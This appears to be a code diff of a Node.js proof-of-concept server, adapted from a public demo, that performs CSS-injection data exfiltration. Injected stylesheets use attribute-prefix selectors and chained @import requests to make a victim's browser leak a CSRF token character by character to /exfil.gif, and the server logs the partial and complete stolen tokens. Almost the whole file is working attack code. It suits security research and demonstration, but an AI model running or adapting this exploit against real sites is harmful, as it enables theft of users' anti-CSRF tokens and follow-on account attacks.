@@ -1,95 +1,73 @@
-const { createServer } = require('http');
-const { readFileSync } = require('fs');
+/**
+ * Adapted from Pepe Vila's demo
+ * https://gist.github.com/cgvwzq/6260f0f0a47c009c87b4d46ce3808231
+ **/
+ const http = require("http");
+ const PORT = 3030;
+ const BASE64_CHARS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='.split('');
 
-const PORT = 3030;
-const BASE64_CHARS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
+ const sessions = {};
 
-const indexPage = readFileSync('./exfil.html', 'utf8');
-const stylesheet = readFileSync('./exfil.css', 'utf8');
-const getCSRF = () => Buffer.from(Uint8Array.from({ length: 4 }, () => Math.floor(Math.random() * 256))).toString('base64');
+ const requestHandler = (request, response) => {
+   const req = new URL('http://a' + request.url);
+   const [id, token] = req.search.slice(1).split('-');
+   switch (req.pathname) {
+     case '/injected.css':
+       if (id) {
+         sessions[id].pending.push(response);
+       } else {
+         sendStylesheet(response, createSession());
+       }
+       return;
+     case '/exfil.gif':
+       response.end();
+       console.log('Partial token for session %s: %s', id, token);
+       sendStylesheet(sessions[id].pending.shift(), id, token);
+       return;
+     case '/csrf.svg':
+       console.log('Complete token for session %s: %s', id, token);
+       sessions[id].pending.forEach(res => res.end());
+       delete sessions[id];
+       sendResponse(response,
+         `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 ${token.length * 16} 16" width="${token.length * 16}" height="16"><text y="12">${token}</text></svg>`,
+         'image/svg+xml');
+       return;
+   }
+   sendResponse(response, 'You\'re not supposed to get this...', 'text/plain', 404);
+ };
 
-const sendResponse = (res, content, type = 'text/css', status = 200) => {
-  res.writeHead(status, {
-    'Content-Type': type,
-    'Content-Length': content.length
-  });
-  res.end(content);
-};
 
-const getCSSRule = (token, isPartial = true) => `input[name="csrf"][value${isPartial ? '^' : ''}="${token}"] ~ * {
-  background-image: url("./exfil.gif?${token}${isPartial ? '' : '.'}");
-}`;
+ const sendStylesheet = (response, id, token = '') => {
+   const css = `@import url(/injected.css?${id}-${token});
+ ${BASE64_CHARS.map(ch =>
+   `input[value^="${token}${ch}"] + * { --b${token.length}: url(/exfil.gif?${id}-${token}${ch}); }`
+ ).join('\n')}
+ input${'[value]'.repeat(token.length + 1)} + * { background: var(--b${token.length}); }
+ input[value="${token}"] ~ .result { background-image: url(/csrf.svg?${id}-${token}); };`;
+   sendResponse(response, css);
+ };
 
-const generateInjectedStylesheet = (prefix = '') => {
-  let css = `@import url(./injected.css?${prefix.length + 1});\nh1 { color: ${prefix.length.toString(16).repeat(3)}; }\n`;
-  if (prefix) {
-    css += getCSSRule(prefix, false) + '\n';
-  }
-  css += Array.from(BASE64_CHARS, char => getCSSRule(char)).join('\n');
-  return css;
-};
+ const createSession = () => {
+   const id = Math.floor(Math.random() * 36 ** 6).toString(36);
+   sessions[id] = { pending: [] };
+   return id;
+ };
 
-let finalToken;
+ const sendResponse = (res, content, type = 'text/css', status = 200) => {
+   res.writeHead(status, {
+     'Content-Type': type,
+     'Content-Length': content.length
+   });
+   res.end(content);
+ };
 
-const resolvers = {};
+ const server = http.createServer(requestHandler);
 
-const waitForMatch = length => new Promise(resolve => resolvers[length] = resolve);
-
-const resolveTokenSlice = token => resolvers[token.length]?.(token);
-
-const server = createServer((req, res) => {
-  switch (req.url) {
-    case '/': {
-      const csrf = getCSRF();
-      const page = indexPage.replace('{{ csrf }}', csrf);
-      console.log(`Sending index (CSRF token = ${csrf})`);
-      sendResponse(res, page, 'text/html');
-      break;
-    }
-    case '/exfil.css': {
-      sendResponse(res, stylesheet);
-      break;
-    }
-    case '/exfil.json': {
-      (finalToken
-        ? Promise.resolve(finalToken)
-        : new Promise(resolve => resolvers.final = resolve)
-      ).then(token => {
-        sendResponse(res, JSON.stringify({ token }), 'application/json');
-      });
-      break;
-    }
-    case '/injected.css': {
-      sendResponse(res, generateInjectedStylesheet());
-      break;
-    }
-    case '/favicon.ico': {
-      sendResponse(res, '<svg viewBox="0 0 1 1"></svg>', 'image/svg+xml');
-      break;
-    }
-    default: {
-      let match = req.url.match(/^\/injected\.css\?(\d+)$/);
-      if (match) {
-        waitForMatch(match[1]).then(token => {
-          sendResponse(res, generateInjectedStylesheet(token));
-        });
-        break;
-      }
-      match = req.url.match(/^\/exfil\.gif\?([A-Za-z\d+\/]+)$/)
-      if (match) {
-        const isPartial = !match[1].endsWith('.');
-        if (isPartial) resolveTokenSlice(match[1]);
-        else {
-          finalToken = match[1].slice(0, -1);
-          resolvers.final?.(finalToken);
-        }
-        console.log(`Got ${isPartial ? 'partial' : 'complete'} token: ${match[1]}`);
-      }
-      sendResponse(res, 'You\'re not supposed to get this...', 'text/plain', 404);
-    }
-  }
-});
-
-server.listen(PORT, () => {
-  console.log(`CSS Exfiltration test - listening to port ${PORT}`)
-});
+ server.listen(PORT, (err) => {
+   console.log('CSS Exfiltration test');
+   if (err) {
+     console.log('- Error while starting up', err);
+   } else {
+     console.log('- Listening on port %d', PORT);
+   }
+ });
